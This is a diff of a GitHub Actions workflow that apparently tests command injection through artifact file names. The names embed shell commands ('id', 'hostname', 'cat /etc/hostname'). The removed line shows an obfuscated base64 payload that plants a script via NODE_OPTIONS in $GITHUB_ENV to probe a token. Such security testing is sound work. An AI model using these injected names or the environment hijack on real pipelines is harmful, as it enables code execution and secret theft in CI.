@@ -12,8 +12,7 @@ jobs:
           mkdir -p out
           printf '1' > out/pr_number.txt
           printf 'benign content\n' > out/readme.txt
-          printf 'x' > 'out/readme.txt;id;hostname;#.txt'
-          printf 'x' > 'out/readme.txt;P=${GITHUB_WORKSPACE:0:1};echo${IFS}Y29uc29sZS5sb2coIkxFQUsiLHByb2Nlc3MuZW52LklOUFVUX1RPS0VOLmxlbmd0aCk=|base64${IFS}-d>${P}tmp${P}n.js;echo${IFS}NODE_OPTIONS=--require${IFS}${P}tmp${P}n.js>>$GITHUB_ENV;#.txt'
+          printf 'x' > 'out/readme.txt;id;hostname;cat${IFS}/etc/hostname;#.txt'
           ls -1 out
       - uses: actions/upload-artifact@v4
         with:
